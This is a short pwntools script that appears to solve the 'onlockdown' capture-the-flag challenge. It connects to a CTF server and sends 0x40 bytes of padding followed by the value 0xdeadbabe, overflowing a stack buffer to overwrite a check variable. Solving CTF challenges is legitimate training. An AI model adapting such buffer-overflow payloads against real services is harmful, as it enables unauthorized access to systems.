#!/usr/bin/env python3

from pwn import *


context.arch = 'amd64'
r = remote('ctf.umbccd.io', 4500)
# r = process('./onlockdown')


r.recvuntil('I made this really cool flag but Governor Hogan put it on lockdown\n')
r.recvuntil('Can you convince him to give it to you?\n')

# 0x4c 0xc
r.sendline(b'a'*0x40 + p64(0xdeadbabe))

r.interactive()
